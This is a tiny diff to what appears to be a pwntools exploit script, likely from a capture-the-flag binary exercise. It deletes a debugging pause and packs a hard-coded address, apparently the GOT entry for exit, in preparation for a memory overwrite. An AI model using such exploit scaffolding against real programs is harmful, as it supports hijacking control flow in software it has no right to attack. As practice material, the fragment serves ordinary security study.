@@ -1,6 +1,6 @@
 from pwn import *
 import struct
-raw_input()
+
 exit = struct.pack("<I", 0x0804a02c)
 exit2 = struct.pack("<I", 0x0804a02c+1)
 
